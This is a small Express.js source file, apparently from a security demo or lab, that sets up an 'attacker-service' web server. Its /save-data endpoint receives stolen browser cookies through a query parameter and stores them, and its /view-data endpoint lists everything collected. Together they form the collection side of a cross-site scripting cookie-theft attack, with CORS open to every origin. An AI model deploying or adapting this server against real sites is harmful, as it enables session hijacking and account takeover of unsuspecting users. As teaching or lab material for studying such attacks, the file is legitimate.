import express from 'express';
import cookieParser from "cookie-parser";
import cors from 'cors';
import {createLogger} from "bunyan";

const logger = createLogger({ name: 'attacker-service' });

const app = express();
const data = new Set();

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());

app.disable('x-powered-by');

app.get('/view-data', (req, res) => {
  const dataAsArray = Array(...data);
  logger.info(dataAsArray);
  res.json(dataAsArray);
});

app.get('/save-data', (req, res) => {
  const cookie = decodeURIComponent(req.query.cookies);
  data.add(cookie);
  logger.info('Saved data: ', cookie);
  res.end();
});

app.listen(8081, '0.0.0.0', () => {
  logger.info('Attacker listening at address http://localhost:8081');
  logger.info('GET /view-data');
  logger.info('GET /save-data');
});
